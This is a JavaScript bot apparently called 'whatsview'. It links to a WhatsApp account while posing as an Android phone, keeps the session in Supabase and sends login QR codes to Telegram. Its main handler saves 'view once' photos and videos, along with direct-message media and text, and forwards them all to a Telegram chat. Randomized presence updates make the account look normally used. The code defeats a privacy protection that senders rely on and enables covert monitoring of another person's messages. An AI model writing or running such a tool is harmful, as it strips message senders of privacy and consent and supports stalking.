import makeWASocket, { useMultiFileAuthState, DisconnectReason, downloadMediaMessage, jidNormalizedUser } from 'baileys'
import pino from 'pino'
import { senderDevice, senderMetadata, sendTelegramMedia, sendTelegramText, shouldSendRegularMedia, shouldSendTextMessages, startDownloadsCleanup, telegramRuntimeConfig } from './telegram.js'
import express from 'express'
import { writeFileSync, mkdirSync, readFileSync, readdirSync, existsSync } from 'fs'
import { createClient } from '@supabase/supabase-js'

const app = express()
const PORT = process.env.PORT || 15000
app.get('/', (req, res) => res.send('Started!'))
app.listen(PORT, () => console.log(`Serving on port ${PORT}`))

const supabaseUrl = process.env.SUPABASE_URL
const supabaseKey = process.env.SUPABASE_KEY
const supabase = createClient(supabaseUrl, supabaseKey)

const BUCKET_NAME = 'auth'
const AUTH_DIR = './auth_info_android_bypass'
const DOWNLOADS_DIR = './downloads'

mkdirSync(DOWNLOADS_DIR, { recursive: true })
if (!existsSync(AUTH_DIR)) mkdirSync(AUTH_DIR, { recursive: true })

const PERSONAL_SUFFIXES = ['@s.whatsapp.net', '@lid', '@c.us']
const MAX_MEDIA_BYTES = 50 * 1024 * 1024

const isPersonal = (jid) => PERSONAL_SUFFIXES.some(s => jid?.endsWith(s))

const PRESENCE_INTERVAL_MIN_MS = 10 * 60_000
const PRESENCE_INTERVAL_MAX_MS = 25 * 60_000
const PRESENCE_BLIP_MIN_MS = 8_000
const PRESENCE_BLIP_MAX_MS = 45_000

const randomBetween = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min
const formatError = (err) => err?.stack || err?.message || String(err)

const formatMediaCaption = (title, metadata, caption) => {
    const hasCaption = typeof caption === 'string' && caption.trim().length > 0
    const parts = [title]
    if (hasCaption) parts.push(caption)
    parts.push(metadata)
    return parts.join('\n\n')
}

let globalSock = null
let presenceTimer = null
let isShuttingDown = false

async function downloadSessionFromSupabase() {
    try {
        console.log('[Supabase] Fetching old session...')
        const { data: files, error } = await supabase.storage.from(BUCKET_NAME).list('auth')
        if (error || !files || files.length === 0) {
            console.log('[Supabase] No session found.')
            return
        }
        for (const file of files) {
            const { data, error: dlError } = await supabase.storage.from(BUCKET_NAME).download(`auth/${file.name}`)
            if (!dlError && data) {
                const buffer = Buffer.from(await data.arrayBuffer())
                writeFileSync(`${AUTH_DIR}/${file.name}`, buffer)
            }
        }
        console.log('[Supabase] Session loaded successfully!')
    } catch (err) {
        console.log('[Supabase] Error:', err.message)
    }
}

async function uploadFileToSupabase(fileName) {
    try {
        const filePath = `${AUTH_DIR}/${fileName}`
        if (!existsSync(filePath)) return
        const fileBuffer = readFileSync(filePath)
        await supabase.storage.from(BUCKET_NAME).upload(`auth/${fileName}`, fileBuffer, { upsert: true })
    } catch (err) {
        console.log(`[Supabase] Error uploading ${fileName}:`, err.message)
    }
}

async function notifyTelegramEvent(title, details) {
    try {
        await sendTelegramText(`[${title}]\nTime: ${new Date().toISOString()}\n${details}`)
    } catch (err) {
        console.log(`[Telegram] Failed to send ${title}: ${err.message}`)
    }
}

function printStartupConfig() {
    const config = telegramRuntimeConfig()
    const will = (enabled) => enabled ? 'will' : 'will NOT'
    console.log([
        '',
        'whatsview started!',
        '--------------------------------------',
        `Telegram: ${config.hasCredentials ? 'OK' : 'MISSING CREDENTIALS'}`,
        `Normal media from DMs ${will(config.sendRegularMedia)} be sent`,
        `Text messages ${will(config.sendTextMessages)} be sent`,
        `View Once media ${will(config.sendViewOnce)} be sent`,
        `Downloads will be cleaned up every 48h`,
        '',
    ].join('\n'))
}

printStartupConfig()
startDownloadsCleanup(DOWNLOADS_DIR)

process.on('unhandledRejection', (err) => {
    console.log(`[Unhandled Rejection] ${formatError(err)}`)
    void notifyTelegramEvent('UNHANDLED REJECTION', formatError(err))
})

process.on('uncaughtException', (err) => {
    console.log(`[Uncaught Exception] ${formatError(err)}`)
    void notifyTelegramEvent('UNCAUGHT EXCEPTION', formatError(err))
})

process.on('SIGINT', () => {
    isShuttingDown = true
    if (globalSock) globalSock.end()
    console.log('Shutting down...')
    process.exit(0)
})

async function startSpoofedSession() {
    if (isShuttingDown) return

    if (globalSock) {
        try { globalSock.end() } catch { }
        globalSock = null
    }
    if (presenceTimer) clearTimeout(presenceTimer)

    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR)

    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ['Pixel 10 Pro', 'WhatsApp', '2.26.16.73'],
        syncFullHistory: false,
        markOnlineOnConnect: false,
    })

    globalSock = sock

    sock.ev.on('creds.update', async () => {
        await saveCreds()
        try {
            const files = readdirSync(AUTH_DIR)
            for (const file of files) {
                if (file.endsWith('.json')) await uploadFileToSupabase(file)
            }
        } catch (e) { }
    })

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update

        if (qr) {
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qr)}`
            console.log('--- New QR CODE ---')
            console.log(qrUrl)
            void notifyTelegramEvent('QR CODE', qrUrl)
        }

        if (connection === 'close') {
            if (presenceTimer) clearTimeout(presenceTimer)
            const statusCode = lastDisconnect?.error?.output?.statusCode
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut

            console.log(`Connection closed (code: ${statusCode}). Reconnecting: ${shouldReconnect}`)

            void notifyTelegramEvent('DISCONNECTED', `Code: ${statusCode || 'unknown'}`)

            if (shouldReconnect && !isShuttingDown) {
                setTimeout(startSpoofedSession, 5000)
            }
        }
        else if (connection === 'open') {
            console.log(`✅ Connected as ${jidNormalizedUser(sock.user?.id)}`)

            const schedulePresence = () => {
                if (isShuttingDown || !globalSock) return

                const delay = randomBetween(PRESENCE_INTERVAL_MIN_MS, PRESENCE_INTERVAL_MAX_MS)
                presenceTimer = setTimeout(async () => {
                    if (!globalSock || globalSock.ws?.readyState !== 1) {
                        schedulePresence()
                        return
                    }

                    try {
                        await globalSock.sendPresenceUpdate('available')
                        await new Promise(r => setTimeout(r, randomBetween(PRESENCE_BLIP_MIN_MS, PRESENCE_BLIP_MAX_MS)))
                        await globalSock.sendPresenceUpdate('unavailable')
                    } catch (err) {
                        if (!err.message?.includes('Closed') && !err.message?.includes('Stream Errored')) {
                            void notifyTelegramEvent('PRESENCE ERROR', formatError(err))
                        }
                    }
                    schedulePresence()
                }, delay)
            }

            schedulePresence()
        }
    })

    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return

        for (const msg of messages) {
            if (!msg.message) continue

            const sender = msg.key.remoteJid
            const metadata = senderMetadata(msg)
            const viewOnceWrapper = msg.message.viewOnceMessageV2 || msg.message.viewOnceMessage || msg.message.viewOnceMessageV2Extension
            const isViewOnce = !!viewOnceWrapper || (msg.message.imageMessage?.viewOnce === true) || (msg.message.videoMessage?.viewOnce === true)

            if (isViewOnce) {
                const inner = viewOnceWrapper?.message || msg.message
                const mediaType = inner?.imageMessage ? 'image' : inner?.videoMessage ? 'video' : 'unknown'
                const ext = mediaType === 'image' ? 'jpg' : 'mp4'
                const caption = inner?.imageMessage?.caption ?? inner?.videoMessage?.caption

                console.log(`\n[VIEW ONCE] ${sender} (${mediaType})`)

                try {
                    const buffer = await downloadMediaMessage(msg, 'buffer', {})
                    const filename = `${DOWNLOADS_DIR}/viewonce_${Date.now()}.${ext}`
                    writeFileSync(filename, buffer)

                    const telegramCaption = formatMediaCaption(`[VIEW ONCE] ${mediaType}`, metadata, caption)
                    await sendTelegramMedia(buffer, filename, mediaType, telegramCaption)
                } catch (err) {
                    console.log(`[ViewOnce] Error: ${err.message}`)
                    void notifyTelegramEvent('VIEW ONCE ERROR', formatError(err))
                }
            }
            else if (isPersonal(sender)) {
                const shortSender = sender.split('@')[0]
                const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text

                const mediaMap = {
                    image: { msg: msg.message.imageMessage, ext: 'jpg' },
                    video: { msg: msg.message.videoMessage, ext: 'mp4' },
                    voice: { msg: msg.message.audioMessage, ext: 'ogg' },
                }

                const mediaType = Object.keys(mediaMap).find(k => mediaMap[k].msg)

                if (mediaType) {
                    const { msg: mediaMsg, ext } = mediaMap[mediaType]
                    const size = Number(mediaMsg.fileLength) || 0
                    const caption = mediaMsg.caption

                    if (size > MAX_MEDIA_BYTES) {
                        console.log(`[DM] ${shortSender} → ${mediaType} file too large`)
                    } else {
                        try {
                            const buffer = await downloadMediaMessage(msg, 'buffer', {})
                            const filename = `${DOWNLOADS_DIR}/${mediaType}_${Date.now()}.${ext}`
                            writeFileSync(filename, buffer)

                            if (shouldSendRegularMedia()) {
                                const telegramCaption = formatMediaCaption(`[DM] ${mediaType}`, metadata, caption)
                                await sendTelegramMedia(buffer, filename, mediaType, telegramCaption)
                            }
                        } catch (err) {
                            void notifyTelegramEvent('DM MEDIA ERROR', formatError(err))
                        }
                    }
                } else if (text && shouldSendTextMessages()) {
                    await sendTelegramText(`[DM TEXT]\n${metadata}\n\n${text}`).catch(() => { })
                }
            }
        }
    })
}

startSpoofedSession()